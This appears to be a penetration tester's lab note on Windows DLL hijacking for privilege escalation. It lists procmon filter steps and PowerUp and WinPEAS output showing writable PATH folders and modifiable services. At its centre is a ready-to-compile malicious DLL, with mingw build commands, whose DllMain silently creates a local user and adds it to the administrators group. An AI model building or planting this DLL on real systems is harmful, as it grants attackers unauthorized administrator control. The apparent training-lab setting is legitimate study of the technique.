
we are looking for a specific instance, when a specific service and instance is being started it looks for its DLL. if the DLL is missing AND we have write permissions on that same folder we can inject our own DLL and make our lives easier
# Enumeration

## Manual 

1. Launch procmon
2. CTRL+L, or press the filter button
3. the first drop down pick `Result`, second dropdown will be `is` then type in `NAME NOT FOUND` and click add
4. For the second filter, on the first drop down pick `Path` and then for the second dropdown pick `ends with` and type in `.dll`

then just click okay and search

## automatic

using powerup

```
[*] Checking %PATH% for potentially hijackable DLL locations...

Permissions       : {ReadAttributes, ReadControl, Execute/Traverse, WriteAttributes...}
ModifiablePath    : C:\Temp
IdentityReference : NT AUTHORITY\Authenticated Users
%PATH%            : C:\Temp
AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
Permissions       : {GenericWrite, Delete, GenericExecute, GenericRead}
ModifiablePath    : C:\Temp
IdentityReference : NT AUTHORITY\Authenticated Users
%PATH%            : C:\Temp
AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
```




```
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user /add sawyer password123 && cmd.exe /c net localgroup administrators sawyer /add");
        ExitProcess(0);
    }
    return TRUE;
}
```



```ls
WinPEAS-ng by @hacktricks_live

/----------------------------------------------------------------------------\
|                             Do you like PEASS?                             |
|----------------------------------------------------------------------------|
|         Follow on Twitter         :     @hacktricks_live                    |
|         Respect on HTB            :     SirBroccoli                         |
|----------------------------------------------------------------------------|
|                                 Thank you!                                 |
\----------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
   Creating Dynamic lists, this could take a while, please wait...
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
  [-] Controlled exception, info about TCM-PC\HomeGroupUser$ not found
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...
        [skipped, file search is disabled]

════════════════════════════════════╣ Services Information ╠════════════════════════════════════

╔══════════╣ Interesting Services -non Microsoft-
╚ Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent

    ===========================================================================

    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
    AWS Lite Guest Agent

    ===========================================================================

    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: ChangeConfig

    ===========================================================================

    dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"] - Manual - Running

    ===========================================================================

    Ec2Config(Amazon Web Services, Inc. - Ec2Config)["C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"] - Auto - Running - isDotNet
    Ec2 Configuration Service

    ===========================================================================

    filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]

    ===========================================================================

    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped

    ===========================================================================

    regsvc(Insecure Registry Service)["C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"] - Manual - Stopped

    ===========================================================================

    unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected

    ===========================================================================

    VGAuthService(VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Stopped
    Alias Manager and Ticket Service

    ===========================================================================

    VMTools(VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Stopped
    Provides support for synchronizing objects between the host and guest operating systems.

    ===========================================================================

    VMware Physical Disk Helper Service(VMware Physical Disk Helper Service)["C:\Program Files\VMware\VMware Tools\vmacthlp.exe"] - Auto - Stopped
    Enables support for running virtual machines from a physical disk partition

    ===========================================================================

    VMwareCAFCommAmqpListener(VMware CAF AMQP Communication Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"] - Manual - Stopped
    VMware Common Agent AMQP Communication Service

    ===========================================================================

    VMwareCAFManagementAgentHost(VMware CAF Management Agent Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"] - Manual - Stopped
    VMware Common Agent Management Agent Service

╔══════════╣ Modifiable Services
╚ Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    daclsvc: ChangeConfig
    wcncsvc: GenericExecute (Start/Stop)

╔══════════╣ Looking if you can modify any service registry
╚ Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\Dnscache (Interactive [CreateSubKey], Users [CreateSubKey])
    HKLM\system\currentcontrolset\services\regsvc (Interactive [FullControl])
    HKLM\system\currentcontrolset\services\RpcEptMapper (Authenticated Users [CreateSubKey], Users [CreateSubKey])

╔══════════╣ Checking write permissions in PATH folders (DLL Hijacking)
╚ Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    (DLL Hijacking) C:\Temp: Authenticated Users [WriteData/CreateFiles]

/----------------------------------------------------------------------------\
|                             Do you like PEASS?                             |
|----------------------------------------------------------------------------|
|         Follow on Twitter         :     @hacktricks_live                    |
|         Respect on HTB            :     SirBroccoli                         |
|----------------------------------------------------------------------------|
|                                 Thank you!                                 |
\----------------------------------------------------------------------------/

C:\Users\user\Desktop\Tools\Process Monitor>

```